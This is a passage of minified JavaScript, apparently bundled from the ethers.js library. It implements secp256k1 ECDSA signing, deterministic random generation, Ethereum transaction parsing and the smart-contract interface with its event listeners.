baaedce6 af48a03b bfd25e8c d0364141",h:"1",hash:Pi.sha256,beta:"7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee",lambda:"5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72",basis:[{a:"3086d221a7d46bcde86c90e49284eb15",b:"-e4437ed6010e88286f547fa90abfe4c3"},{a:"114ca50f7a8e2f3f657c1108d9d44cfd8",b:"3086d221a7d46bcde86c90e49284eb15"}],gRed:!1,g:["79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798","483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8",o]})});function ao(t){if(!(this instanceof ao))return new ao(t);this.hash=t.hash,this.predResist=!!t.predResist,this.outLen=this.hash.outSize,this.minEntropy=t.minEntropy||this.hash.hmacStrength,this._reseed=null,this.reseedInterval=null,this.K=null,this.V=null;var e=fi.toArray(t.entropy,t.entropyEnc||"hex"),r=fi.toArray(t.nonce,t.nonceEnc||"hex"),n=fi.toArray(t.pers,t.persEnc||"hex");Xy(e.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._init(e,r,n)}var Vx=ao;ao.prototype._init=function(e,r,n){var i=e.concat(r).concat(n);this.K=new Array(this.outLen/8),this.V=new Array(this.outLen/8);for(var s=0;s<this.V.length;s++)this.K[s]=0,this.V[s]=1;this._update(i),this._reseed=1,this.reseedInterval=281474976710656};ao.prototype._hmac=function(){return new Pi.hmac(this.hash,this.K)};ao.prototype._update=function(e){var r=this._hmac().update(this.V).update([0]);e&&(r=r.update(e)),this.K=r.digest(),this.V=this._hmac().update(this.V).digest(),e&&(this.K=this._hmac().update(this.V).update([1]).update(e).digest(),this.V=this._hmac().update(this.V).digest())};ao.prototype.reseed=function(e,r,n,i){typeof r!="string"&&(i=n,n=r,r=null),e=fi.toArray(e,r),n=fi.toArray(n,i),Xy(e.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._update(e.concat(n||[])),this._reseed=1};ao.prototype.generate=function(e,r,n,i){if(this._reseed>this.reseedInterval)throw new Error("Reseed is required");typeof r!="string"&&(i=n,n=r,r=null),n&&(n=fi.toArray(n,i||"hex"),this._update(n));for(var s=[];s.length<e;)this.V=this._hmac().update(this.V).digest(),s=s.concat(this.V);var o=s.slice(0,e);return this._update(n),this._reseed++,fi.encode(o,r)};var $0=kn.assert;function Hr(t,e){this.ec=t,this.priv=null,this.pub=null,e.priv&&this._importPrivate(e.priv,e.privEnc),e.pub&&this._importPublic(e.pub,e.pubEnc)}var tw=Hr;Hr.fromPublic=function(e,r,n){return r instanceof Hr?r:new Hr(e,{pub:r,pubEnc:n})};Hr.fromPrivate=function(e,r,n){return r instanceof Hr?r:new Hr(e,{priv:r,privEnc:n})};Hr.prototype.validate=function(){var e=this.getPublic();return e.isInfinity()?{result:!1,reason:"Invalid public key"}:e.validate()?e.mul(this.ec.curve.n).isInfinity()?{result:!0,reason:null}:{result:!1,reason:"Public key * N != O"}:{result:!1,reason:"Public key is not a point"}};Hr.prototype.getPublic=function(e,r){return typeof e=="string"&&(r=e,e=null),this.pub||(this.pub=this.ec.g.mul(this.priv)),r?this.pub.encode(r,e):this.pub};Hr.prototype.getPrivate=function(e){return e==="hex"?this.priv.toString(16,2):this.priv};Hr.prototype._importPrivate=function(e,r){this.priv=new Ce(e,r||16),this.priv=this.priv.umod(this.ec.curve.n)};Hr.prototype._importPublic=function(e,r){if(e.x||e.y){this.ec.curve.type==="mont"?$0(e.x,"Need x coordinate"):(this.ec.curve.type==="short"||this.ec.curve.type==="edwards")&&$0(e.x&&e.y,"Need both x and y coordinate"),this.pub=this.ec.curve.point(e.x,e.y);return}this.pub=this.ec.curve.decodePoint(e,r)};Hr.prototype.derive=function(e){return e.validate()||$0(e.validate(),"public point not validated"),e.mul(this.priv).getX()};Hr.prototype.sign=function(e,r,n){return this.ec.sign(e,this,r,n)};Hr.prototype.verify=function(e,r,n){return this.ec.verify(e,r,this,void 0,n)};Hr.prototype.inspect=function(){return"<Key priv: "+(this.priv&&this.priv.toString(16,2))+" pub: "+(this.pub&&this.pub.inspect())+" >"};var XK=kn.assert;function ip(t,e){if(t instanceof ip)return t;this._importDER(t,e)||(XK(t.r&&t.s,"Signature without r or s"),this.r=new Ce(t.r,16),this.s=new Ce(t.s,16),t.recoveryParam===void 0?this.recoveryParam=null:this.recoveryParam=t.recoveryParam)}var sp=ip;function eQ(){this.place=0}function im(t,e){var r=t[e.place++];if(!(r&128))return r;var n=r&15;if(n===0||n>4||t[e.place]===0)return!1;for(var i=0,s=0,o=e.place;s<n;s++,o++)i<<=8,i|=t[o],i>>>=0;return i<=127?!1:(e.place=o,i)}function n1(t){for(var e=0,r=t.length-1;!t[e]&&!(t[e+1]&128)&&e<r;)e++;return e===0?t:t.slice(e)}ip.prototype._importDER=function(e,r){e=kn.toArray(e,r);var n=new eQ;if(e[n.place++]!==48)return!1;var i=im(e,n);if(i===!1||i+n.place!==e.length||e[n.place++]!==2)return!1;var s=im(e,n);if(s===!1||(e[n.place]&128)!==0)return!1;var o=e.slice(n.place,s+n.place);if(n.place+=s,e[n.place++]!==2)return!1;var a=im(e,n);if(a===!1||e.length!==a+n.place||(e[n.place]&128)!==0)return!1;var c=e.slice(n.place,a+n.place);if(o[0]===0)if(o[1]&128)o=o.slice(1);else return!1;if(c[0]===0)if(c[1]&128)c=c.slice(1);else return!1;return this.r=new Ce(o),this.s=new Ce(c),this.recoveryParam=null,!0};function sm(t,e){if(e<128){t.push(e);return}var r=1+(Math.log(e)/Math.LN2>>>3);for(t.push(r|128);--r;)t.push(e>>>(r<<3)&255);t.push(e)}ip.prototype.toDER=function(e){var r=this.r.toArray(),n=this.s.toArray();for(r[0]&128&&(r=[0].concat(r)),n[0]&128&&(n=[0].concat(n)),r=n1(r),n=n1(n);!n[0]&&!(n[1]&128);)n=n.slice(1);var i=[2];sm(i,r.length),i=i.concat(r),i.push(2),sm(i,n.length);var s=i.concat(n),o=[48];return sm(o,s.length),o=o.concat(s),kn.encode(o,e)};var tQ=function(){throw new Error("unsupported")},Bo=kn.assert;function Gn(t){if(!(this instanceof Gn))return new Gn(t);typeof t=="string"&&(Bo(Object.prototype.hasOwnProperty.call(_d,t),"Unknown curve "+t),t=_d[t]),t instanceof _d.PresetCurve&&(t={curve:t}),this.curve=t.curve.curve,this.n=this.curve.n,this.nh=this.n.ushrn(1),this.g=this.curve.g,this.g=t.curve.g,this.g.precompute(t.curve.n.bitLength()+1),this.hash=t.hash||t.curve.hash}var rQ=Gn;Gn.prototype.keyPair=function(e){return new tw(this,e)};Gn.prototype.keyFromPrivate=function(e,r){return tw.fromPrivate(this,e,r)};Gn.prototype.keyFromPublic=function(e,r){return tw.fromPublic(this,e,r)};Gn.prototype.genKeyPair=function(e){e||(e={});for(var r=new Vx({hash:this.hash,pers:e.pers,persEnc:e.persEnc||"utf8",entropy:e.entropy||tQ(this.hash.hmacStrength),entropyEnc:e.entropy&&e.entropyEnc||"utf8",nonce:this.n.toArray()}),n=this.n.byteLength(),i=this.n.sub(new Ce(2));;){var s=new Ce(r.generate(n));if(!(s.cmp(i)>0))return s.iaddn(1),this.keyFromPrivate(s)}};Gn.prototype._truncateToN=function(e,r,n){var i;if(Ce.isBN(e)||typeof e=="number")e=new Ce(e,16),i=e.byteLength();else if(typeof e=="object")i=e.length,e=new Ce(e,16);else{var s=e.toString();i=s.length+1>>>1,e=new Ce(s,16)}typeof n!="number"&&(n=i*8);var o=n-this.n.bitLength();return o>0&&(e=e.ushrn(o)),!r&&e.cmp(this.n)>=0?e.sub(this.n):e};Gn.prototype.sign=function(e,r,n,i){if(typeof n=="object"&&(i=n,n=null),i||(i={}),typeof e!="string"&&typeof e!="number"&&!Ce.isBN(e)){Bo(typeof e=="object"&&e&&typeof e.length=="number","Expected message to be an array-like, a hex string, or a BN instance"),Bo(e.length>>>0===e.length);for(var s=0;s<e.length;s++)Bo((e[s]&255)===e[s])}r=this.keyFromPrivate(r,n),e=this._truncateToN(e,!1,i.msgBitLength),Bo(!e.isNeg(),"Can not sign a negative message");var o=this.n.byteLength(),a=r.getPrivate().toArray("be",o),c=e.toArray("be",o);Bo(new Ce(c).eq(e),"Can not sign message");for(var u=new Vx({hash:this.hash,entropy:a,nonce:c,pers:i.pers,persEnc:i.persEnc||"utf8"}),l=this.n.sub(new Ce(1)),h=0;;h++){var d=i.k?i.k(h):new Ce(u.generate(this.n.byteLength()));if(d=this._truncateToN(d,!0),!(d.cmpn(1)<=0||d.cmp(l)>=0)){var g=this.g.mul(d);if(!g.isInfinity()){var y=g.getX(),m=y.umod(this.n);if(m.cmpn(0)!==0){var b=d.invm(this.n).mul(m.mul(r.getPrivate()).iadd(e));if(b=b.umod(this.n),b.cmpn(0)!==0){var A=(g.getY().isOdd()?1:0)|(y.cmp(m)!==0?2:0);return i.canonical&&b.cmp(this.nh)>0&&(b=this.n.sub(b),A^=1),new sp({r:m,s:b,recoveryParam:A})}}}}}};Gn.prototype.verify=function(e,r,n,i,s){s||(s={}),e=this._truncateToN(e,!1,s.msgBitLength),n=this.keyFromPublic(n,i),r=new sp(r,"hex");var o=r.r,a=r.s;if(o.cmpn(1)<0||o.cmp(this.n)>=0||a.cmpn(1)<0||a.cmp(this.n)>=0)return!1;var c=a.invm(this.n),u=c.mul(e).umod(this.n),l=c.mul(o).umod(this.n),h;return this.curve._maxwellTrick?(h=this.g.jmulAdd(u,n.getPublic(),l),h.isInfinity()?!1:h.eqXToP(o)):(h=this.g.mulAdd(u,n.getPublic(),l),h.isInfinity()?!1:h.getX().umod(this.n).cmp(o)===0)};Gn.prototype.recoverPubKey=function(t,e,r,n){Bo((3&r)===r,"The recovery param is more than two bits"),e=new sp(e,n);var i=this.n,s=new Ce(t),o=e.r,a=e.s,c=r&1,u=r>>1;if(o.cmp(this.curve.p.umod(this.curve.n))>=0&&u)throw new Error("Unable to find sencond key candinate");u?o=this.curve.pointFromX(o.add(this.curve.n),c):o=this.curve.pointFromX(o,c);var l=e.r.invm(i),h=i.sub(s).mul(l).umod(i),d=a.mul(l).umod(i);return this.g.mulAdd(h,o,d)};Gn.prototype.getKeyRecoveryParam=function(t,e,r,n){if(e=new sp(e,n),e.recoveryParam!==null)return e.recoveryParam;for(var i=0;i<4;i++){var s;try{s=this.recoverPubKey(t,e,i)}catch{continue}if(s.eq(r))return i}throw new Error("Unable to find valid recovery factor")};var nQ=Vc(function(t,e){var r=e;r.version="6.6.1",r.utils=kn,r.rand=function(){throw new Error("unsupported")},r.curve=Ad,r.curves=_d,r.ec=rQ,r.eddsa=null}),iQ=nQ.ec;const sQ="signing-key/5.8.0",L0=new H(sQ);let om=null;function qs(){return om||(om=new iQ("secp256k1")),om}class oQ{constructor(e){X(this,"curve","secp256k1"),X(this,"privateKey",we(e)),fa(this.privateKey)!==32&&L0.throwArgumentError("invalid private key","privateKey","[[ REDACTED ]]");const r=qs().keyFromPrivate(ve(this.privateKey));X(this,"publicKey","0x"+r.getPublic(!1,"hex")),X(this,"compressedPublicKey","0x"+r.getPublic(!0,"hex")),X(this,"_isSigningKey",!0)}_addPoint(e){const r=qs().keyFromPublic(ve(this.publicKey)),n=qs().keyFromPublic(ve(e));return"0x"+r.pub.add(n.pub).encodeCompressed("hex")}signDigest(e){const r=qs().keyFromPrivate(ve(this.privateKey)),n=ve(e);n.length!==32&&L0.throwArgumentError("bad digest length","digest",e);const i=r.sign(n,{canonical:!0});return ep({recoveryParam:i.recoveryParam,r:Vt("0x"+i.r.toString(16),32),s:Vt("0x"+i.s.toString(16),32)})}computeSharedSecret(e){const r=qs().keyFromPrivate(ve(this.privateKey)),n=qs().keyFromPublic(ve(Kx(e)));return Vt("0x"+r.derive(n.getPublic()).toString(16),32)}static isSigningKey(e){return!!(e&&e._isSigningKey)}}function aQ(t,e){const r=ep(e),n={r:ve(r.r),s:ve(r.s)};return"0x"+qs().recoverPubKey(ve(t),n,r.recoveryParam).encode("hex",!1)}function Kx(t,e){const r=ve(t);return r.length===32?new oQ(r).publicKey:r.length===33?"0x"+qs().keyFromPublic(r).getPublic(!1,"hex"):r.length===65?we(r):L0.throwArgumentError("invalid public or private key","key","[REDACTED]")}const cQ="transactions/5.8.0",Cs=new H(cQ);var i1;(function(t){t[t.legacy=0]="legacy",t[t.eip2930=1]="eip2930",t[t.eip1559=2]="eip1559"})(i1||(i1={}));function rw(t){return t==="0x"?null:Mr(t)}function zr(t){return t==="0x"?xx:ne.from(t)}function uQ(t){const e=Kx(t);return Mr(qr(fr(qr(e,1)),12))}function Qx(t,e){return uQ(aQ(ve(t),e))}function Sn(t,e){const r=Rc(ne.from(t).toHexString());return r.length>32&&Cs.throwArgumentError("invalid length for "+e,"transaction:"+e,t),r}function am(t,e){return{address:Mr(t),storageKeys:(e||[]).map((r,n)=>(fa(r)!==32&&Cs.throwArgumentError("invalid access list storageKey",`accessList[${t}:${n}]`,r),r.toLowerCase()))}}function Kc(t){if(Array.isArray(t))return t.map((r,n)=>Array.isArray(r)?(r.length>2&&Cs.throwArgumentError("access list expected to be [ address, storageKeys[] ]",`value[${n}]`,r),am(r[0],r[1])):am(r.address,r.storageKeys));const e=Object.keys(t).map(r=>{const n=t[r].reduce((i,s)=>(i[s]=!0,i),{});return am(r,Object.keys(n).sort())});return e.sort((r,n)=>r.address.localeCompare(n.address)),e}function Yx(t){return Kc(t).map(e=>[e.address,e.storageKeys])}function lQ(t,e){if(t.gasPrice!=null){const n=ne.from(t.gasPrice),i=ne.from(t.maxFeePerGas||0);n.eq(i)||Cs.throwArgumentError("mismatch EIP-1559 gasPrice != maxFeePerGas","tx",{gasPrice:n,maxFeePerGas:i})}const r=[Sn(t.chainId||0,"chainId"),Sn(t.nonce||0,"nonce"),Sn(t.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),Sn(t.maxFeePerGas||0,"maxFeePerGas"),Sn(t.gasLimit||0,"gasLimit"),t.to!=null?Mr(t.to):"0x",Sn(t.value||0,"value"),t.data||"0x",Yx(t.accessList||[])];if(e){const n=ep(e);r.push(Sn(n.recoveryParam,"recoveryParam")),r.push(Rc(n.r)),r.push(Rc(n.s))}return dn(["0x02",tp(r)])}function hQ(t,e){const r=[Sn(t.chainId||0,"chainId"),Sn(t.nonce||0,"nonce"),Sn(t.gasPrice||0,"gasPrice"),Sn(t.gasLimit||0,"gasLimit"),t.to!=null?Mr(t.to):"0x",Sn(t.value||0,"value"),t.data||"0x",Yx(t.accessList||[])];if(e){const n=ep(e);r.push(Sn(n.recoveryParam,"recoveryParam")),r.push(Rc(n.r)),r.push(Rc(n.s))}return dn(["0x01",tp(r)])}function Jx(t,e,r){try{const n=zr(e[0]).toNumber();if(n!==0&&n!==1)throw new Error("bad recid");t.v=n}catch{Cs.throwArgumentError("invalid v for transaction type: 1","v",e[0])}t.r=Vt(e[1],32),t.s=Vt(e[2],32);try{const n=fr(r(t));t.from=Qx(n,{r:t.r,s:t.s,recoveryParam:t.v})}catch{}}function dQ(t){const e=Yy(t.slice(1));e.length!==9&&e.length!==12&&Cs.throwArgumentError("invalid component count for transaction type: 2","payload",we(t));const r=zr(e[2]),n=zr(e[3]),i={type:2,chainId:zr(e[0]).toNumber(),nonce:zr(e[1]).toNumber(),maxPriorityFeePerGas:r,maxFeePerGas:n,gasPrice:null,gasLimit:zr(e[4]),to:rw(e[5]),value:zr(e[6]),data:e[7],accessList:Kc(e[8])};return e.length===9||(i.hash=fr(t),Jx(i,e.slice(9),lQ)),i}function fQ(t){const e=Yy(t.slice(1));e.length!==8&&e.length!==11&&Cs.throwArgumentError("invalid component count for transaction type: 1","payload",we(t));const r={type:1,chainId:zr(e[0]).toNumber(),nonce:zr(e[1]).toNumber(),gasPrice:zr(e[2]),gasLimit:zr(e[3]),to:rw(e[4]),value:zr(e[5]),data:e[6],accessList:Kc(e[7])};return e.length===8||(r.hash=fr(t),Jx(r,e.slice(8),hQ)),r}function pQ(t){const e=Yy(t);e.length!==9&&e.length!==6&&Cs.throwArgumentError("invalid raw transaction","rawTransaction",t);const r={nonce:zr(e[0]).toNumber(),gasPrice:zr(e[1]),gasLimit:zr(e[2]),to:rw(e[3]),value:zr(e[4]),data:e[5],chainId:0};if(e.length===6)return r;try{r.v=ne.from(e[6]).toNumber()}catch{return r}if(r.r=Vt(e[7],32),r.s=Vt(e[8],32),ne.from(r.r).isZero()&&ne.from(r.s).isZero())r.chainId=r.v,r.v=0;else{r.chainId=Math.floor((r.v-35)/2),r.chainId<0&&(r.chainId=0);let n=r.v-27;const i=e.slice(0,6);r.chainId!==0&&(i.push(we(r.chainId)),i.push("0x"),i.push("0x"),n-=r.chainId*2+8);const s=fr(tp(i));try{r.from=Qx(s,{r:we(r.r),s:we(r.s),recoveryParam:n})}catch{}r.hash=fr(t)}return r.type=null,r}function gQ(t){const e=ve(t);if(e[0]>127)return pQ(e);switch(e[0]){case 1:return fQ(e);case 2:return dQ(e)}return Cs.throwError(`unsupported transaction type: ${e[0]}`,H.errors.UNSUPPORTED_OPERATION,{operation:"parseTransaction",transactionType:e[0]})}const mQ="contracts/5.8.0";var ga=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const er=new H(mQ);function mf(t,e){return ga(this,void 0,void 0,function*(){const r=yield e;typeof r!="string"&&er.throwArgumentError("invalid address or ENS name","name",r);try{return Mr(r)}catch{}t||er.throwError("a provider or signer is needed to resolve ENS names",H.errors.UNSUPPORTED_OPERATION,{operation:"resolveName"});const n=yield t.resolveName(r);return n==null&&er.throwArgumentError("resolver or addr is not configured for ENS name","name",r),n})}function Cd(t,e,r){return ga(this,void 0,void 0,function*(){return Array.isArray(r)?yield Promise.all(r.map((n,i)=>Cd(t,Array.isArray(e)?e[i]:e[n.name],n))):r.type==="address"?yield mf(t,e):r.type==="tuple"?yield Cd(t,e,r.components):r.baseType==="array"?Array.isArray(e)?yield Promise.all(e.map(n=>Cd(t,n,r.arrayChildren))):Promise.reject(er.makeError("invalid value for array",H.errors.INVALID_ARGUMENT,{argument:"value",value:e})):e})}function op(t,e,r){return ga(this,void 0,void 0,function*(){let n={};r.length===e.inputs.length+1&&typeof r[r.length-1]=="object"&&(n=pr(r.pop())),er.checkArgumentCount(r.length,e.inputs.length,"passed to contract"),t.signer?n.from?n.from=sr({override:mf(t.signer,n.from),signer:t.signer.getAddress()}).then(u=>ga(this,void 0,void 0,function*(){return Mr(u.signer)!==u.override&&er.throwError("Contract with a Signer cannot override from",H.errors.UNSUPPORTED_OPERATION,{operation:"overrides.from"}),u.override})):n.from=t.signer.getAddress():n.from&&(n.from=mf(t.provider,n.from));const i=yield sr({args:Cd(t.signer||t.provider,r,e.inputs),address:t.resolvedAddress,overrides:sr(n)||{}}),s=t.interface.encodeFunctionData(e,i.args),o={data:s,to:i.address},a=i.overrides;if(a.nonce!=null&&(o.nonce=ne.from(a.nonce).toNumber()),a.gasLimit!=null&&(o.gasLimit=ne.from(a.gasLimit)),a.gasPrice!=null&&(o.gasPrice=ne.from(a.gasPrice)),a.maxFeePerGas!=null&&(o.maxFeePerGas=ne.from(a.maxFeePerGas)),a.maxPriorityFeePerGas!=null&&(o.maxPriorityFeePerGas=ne.from(a.maxPriorityFeePerGas)),a.from!=null&&(o.from=a.from),a.type!=null&&(o.type=a.type),a.accessList!=null&&(o.accessList=Kc(a.accessList)),o.gasLimit==null&&e.gas!=null){let u=21e3;const l=ve(s);for(let h=0;h<l.length;h++)u+=4,l[h]&&(u+=64);o.gasLimit=ne.from(e.gas).add(u)}if(a.value){const u=ne.from(a.value);!u.isZero()&&!e.payable&&er.throwError("non-payable method cannot override value",H.errors.UNSUPPORTED_OPERATION,{operation:"overrides.value",value:n.value}),o.value=u}a.customData&&(o.customData=pr(a.customData)),a.ccipReadEnabled&&(o.ccipReadEnabled=!!a.ccipReadEnabled),delete n.nonce,delete n.gasLimit,delete n.gasPrice,delete n.from,delete n.value,delete n.type,delete n.accessList,delete n.maxFeePerGas,delete n.maxPriorityFeePerGas,delete n.customData,delete n.ccipReadEnabled;const c=Object.keys(n).filter(u=>n[u]!=null);return c.length&&er.throwError(`cannot override ${c.map(u=>JSON.stringify(u)).join(",")}`,H.errors.UNSUPPORTED_OPERATION,{operation:"overrides",overrides:c}),o})}function yQ(t,e){return function(...r){return op(t,e,r)}}function wQ(t,e){const r=t.signer||t.provider;return function(...n){return ga(this,void 0,void 0,function*(){r||er.throwError("estimate require a provider or signer",H.errors.UNSUPPORTED_OPERATION,{operation:"estimateGas"});const i=yield op(t,e,n);return yield r.estimateGas(i)})}}function bQ(t,e){const r=e.wait.bind(e);e.wait=n=>r(n).then(i=>(i.events=i.logs.map(s=>{let o=Es(s),a=null;try{a=t.interface.parseLog(s)}catch{}return a&&(o.args=a.args,o.decode=(c,u)=>t.interface.decodeEventLog(a.eventFragment,c,u),o.event=a.name,o.eventSignature=a.signature),o.removeListener=()=>t.provider,o.getBlock=()=>t.provider.getBlock(i.blockHash),o.getTransaction=()=>t.provider.getTransaction(i.transactionHash),o.getTransactionReceipt=()=>Promise.resolve(i),o}),i))}function Zx(t,e,r){const n=t.signer||t.provider;return function(...i){return ga(this,void 0,void 0,function*(){let s;if(i.length===e.inputs.length+1&&typeof i[i.length-1]=="object"){const c=pr(i.pop());c.blockTag!=null&&(s=yield c.blockTag),delete c.blockTag,i.push(c)}t.deployTransaction!=null&&(yield t._deployed(s));const o=yield op(t,e,i),a=yield n.call(o,s);try{let c=t.interface.decodeFunctionResult(e,a);return r&&e.outputs.length===1&&(c=c[0]),c}catch(c){throw c.code===H.errors.CALL_EXCEPTION&&(c.address=t.address,c.args=i,c.transaction=o),c}})}}function vQ(t,e){return function(...r){return ga(this,void 0,void 0,function*(){t.signer||er.throwError("sending a transaction requires a signer",H.errors.UNSUPPORTED_OPERATION,{operation:"sendTransaction"}),t.deployTransaction!=null&&(yield t._deployed());const n=yield op(t,e,r),i=yield t.signer.sendTransaction(n);return bQ(t,i),i})}}function s1(t,e,r){return e.constant?Zx(t,e,r):vQ(t,e)}function Xx(t){return t.address&&(t.topics==null||t.topics.length===0)?"*":(t.address||"*")+"@"+(t.topics?t.topics.map(e=>Array.isArray(e)?e.join("|"):e).join(":"):"")}class zl{constructor(e,r){X(this,"tag",e),X(this,"filter",r),this._listeners=[]}addListener(e,r){this._listeners.push({listener:e,once:r})}removeListener(e){let r=!1;this._listeners=this._listeners.filter(n=>r||n.listener!==e?!0:(r=!0,!1))}removeAllListeners(){this._listeners=[]}listeners(){return this._listeners.map(e=>e.listener)}listenerCount(){return this._listeners.length}run(e){const r=this.listenerCount();return this._listeners=this._listeners.filter(n=>{const i=e.slice();return setTimeout(()=>{n.listener.apply(this,i)},0),!n.once}),r}prepareEvent(e){}getEmit(e){return[e]}}class EQ extends zl{constructor(){super("error",null)}}class o1 extends zl{constructor(e,r,n,i){const s={address:e};let o=r.getEventTopic(n);i?(o!==i[0]&&er.throwArgumentError("topic mismatch","topics",i),s.topics=i.slice()):s.topics=[o],super(Xx(s),s),X(this,"address",e),X(this,"interface",r),X(this,"fragment",n)}prepareEvent(e){super.prepareEvent(e),e.event=this.fragment.name,e.eventSignature=this.fragment.format(),e.decode=(r,n)=>this.interface.decodeEventLog(this.fragment,r,n);try{e.args=this.interface.decodeEventLog(this.fragment,e.data,e.topics)}catch(r){e.args=null,e.decodeError=r}}getEmit(e){const r=vV(e.args);if(r.length)throw r[0].error;const n=(e.args||[]).slice();return n.push(e),n}}class a1 extends zl{constructor(e,r){super("*",{address:e}),X(this,"address",e),X(this,"interface",r)}prepareEvent(e){super.prepareEvent(e);try{const r=this.interface.parseLog(e);e.event=r.name,e.eventSignature=r.signature,e.decode=(n,i)=>this.interface.decodeEventLog(r.eventFragment,n,i),e.args=r.args}catch{}}}class AQ{constructor(e,r,n){X(this,"interface",Bi(new.target,"getInterface")(r)),n==null?(X(this,"provider",null),X(this,"signer",null)):bh.isSigner(n)?(X(this,"provider",n.provider||null),X(this,"signer",n)):np.isProvider(n)?(X(this,"provider",n),X(this,"signer",null)):er.throwArgumentError("invalid signer or provider","signerOrProvider",n),X(this,"callStatic",{}),X(this,"estimateGas",{}),X(this,"functions",{}),X(this,"populateTransaction",{}),X(this,"filters",{});{const o={};Object.keys(this.interface.events).forEach(a=>{const c=this.interface.events[a];X(this.filters,a,(...u)=>({address:this.address,topics:this.interface.encodeFilterTopics(c,u)})),o[c.name]||(o[c.name]=[]),o[c.name].push(a)}),Object.keys(o).forEach(a=>{const c=o[a];c.length===1?X(this.filters,a,this.filters[c[0]]):er.warn(`Duplicate definition of ${a} (${c.join(", ")})`)})}if(X(this,"_runningEvents",{}),X(this,"_wrappedEmits",{}),e==null&&er.throwArgumentError("invalid contract address or ENS name","addressOrName",e),X(this,"address",e),this.provider)X(this,"resolvedAddress",mf(this.provider,e));else try{X(this,"resolvedAddress",Promise.resolve(Mr(e)))}catch{er.throwError("provider is required to use ENS name as contract address",H.errors.UNSUPPORTED_OPERATION,{operation:"new Contract"})}this.resolvedAddress.catch(o=>{});const i={},s={};Object.keys(this.interface.functions).forEach(o=>{const a=this.interface.functions[o];if(s[o]){er.warn(`Duplicate ABI entry for ${JSON.stringify(o)}`);return}s[o]=!0;{const c=a.name;i[`%${c}`]||(i[`%${c}`]=[]),i[`%${c}`].push(o)}this[o]==null&&X(this,o,s1(this,a,!0)),this.functions[o]==null&&X(this.functions,o,s1(this,a,!1)),this.callStatic[o]==null&&X(this.callStatic,o,Zx(this,a,!0)),this.populateTransaction[o]==null&&X(this.populateTransaction,o,yQ(this,a)),this.estimateGas[o]==null&&X(this.estimateGas,o,wQ(this,a))}),Object.keys(i).forEach(o=>{const a=i[o];if(a.length>1)return;o=o.substring(1);const c=a[0];try{this[o]==null&&X(this,o,this[c])}catch{}this.functions[o]==null&&X(this.functions,o,this.functions[c]),this.callStatic[o]==null&&X(this.callStatic,o,this.callStatic[c]),this.populateTransaction[o]==null&&X(this.populateTransaction,o,this.populateTransaction[c]),this.estimateGas[o]==null&&X(this.estimateGas,o,this.estimateGas[c])})}static getContractAddress(e){return Ax(e)}static getInterface(e){return qA.isInterface(e)?e:new qA(e)}deployed(){return this._deployed()}_deployed(e){return this._deployedPromise||(this.deployTransaction?this._deployedPromise=this.deployTransaction.wait().then(()=>this):this._deployedPromise=this.provider.getCode(this.address,e).then(r=>(r==="0x"&&er.throwError("contract not deployed",H.errors.UNSUPPORTED_OPERATION,{contractAddress:this.address,operation:"getDeployed"}),this))),this._deployedPromise}fallback(e){this.signer||er.throwError("sending a transactions require a signer",H.errors.UNSUPPORTED_OPERATION,{operation:"sendTransaction(fallback)"});const r=pr(e||{});return["from","to"].forEach(function(n){r[n]!=null&&er.throwError("cannot override "+n,H.errors.UNSUPPORTED_OPERATION,{operation:n})}),r.to=this.resolvedAddress,this.deployed().then(()=>this.signer.sendTransaction(r))}connect(e){typeof e=="string"&&(e=new Zy(e,this.provider));const r=new this.constructor(this.address,this.interface,e);return this.deployTransaction&&X(r,"deployTransaction",this.deployTransaction),r}attach(e){return new this.constructor(e,this.interface,this.signer||this.provider)}static isIndexed(e){return U0.isIndexed(e)}_normalizeRunningEvent(e){return this._runningEvents[e.tag]?this._runningEvents[e.tag]:e}_getRunningEvent(e){if(typeof e=="string"){if(e==="error")return this._normalizeRunningEvent(new EQ);if(e==="event")return this._normalizeRunningEvent(new zl("event",null));if(e==="*")return this._normalizeRunningEvent(new a1(this.address,this.interface));const r=this.interface.getEvent(e);return this._normalizeRunningEvent(new o1(this.address,this.interface,r))}if(e.topics&&e.topics.length>0){try{const n=e.topics[0];if(typeof n!="string")throw new Error("invalid topic");const i=this.interface.getEvent(n);return this._normalizeRunningEvent(new o1(this.address,this.interface,i,e.topics))}catch{}const r={address:this.address,topics:e.topics};return this._normalizeRunningEvent(new zl(Xx(r),r))}return this._normalizeRunningEvent(new a1(this.address,this.interface))}_checkRunningEvents(e){if(e.listenerCount()===0){delete this._runningEvents[e.tag];const r=this._wrappedEmits[e.tag];r&&e.filter&&(this.provider.off(e.filter,r),delete this._wrappedEmits[e.tag])}}_wrapEvent(e,r,n){const i=Es(r);return i.removeListener=()=>{n&&(e.removeListener(n),this._checkRunningEvents(e))},i.getBlock=()=>this.provider.getBlock(r.blockHash),i.getTransaction=()=>this.provider.getTransaction(r.transactionHash),i.getTransactionReceipt=()=>this.provider.getTransactionReceipt(r.transactionHash),e.prepareEvent(i),i}_addEventListener(e,r,n){if(this.provider||er.throwError("events require a provider or a signer with a provider",H.errors.UNSUPPORTED_OPERATION,{operation:"once"}),e.addListener(r,n),this._runningEvents[e.tag]=e,!this._wrappedEmits[e.tag]){const i=s=>{let o=this._wrapEvent(e,s,r);if(o.decodeError==null)try{const a=e.getEmit(o);this.emit(e.filter,...a)}catch(a){o.decodeError=a.error}e.filter!=null&&this.emit("event",o),o.decodeError!=null&&this.emit("error",o.decodeError,o)};this._wrappedEmits[e.tag]=i,e.filter!=null&&this.provider.on(e.filter,i)}}queryFilter(e,r,n){const i=this._getRunningEvent(e),s=pr(i.filter);return typeof r=="string"&&Ye(r,32)?(n!=null&&er.throwArgumentError("cannot specify toBlock with blockhash","toBlock",n),s.blockHash=r):(s.fromBlock=r??0,s.toBlock=n??"latest"),this.provider.getLogs(s).then(o=>o.map(a=>this._wrapEvent(i,a,null)))}on(e,r){return 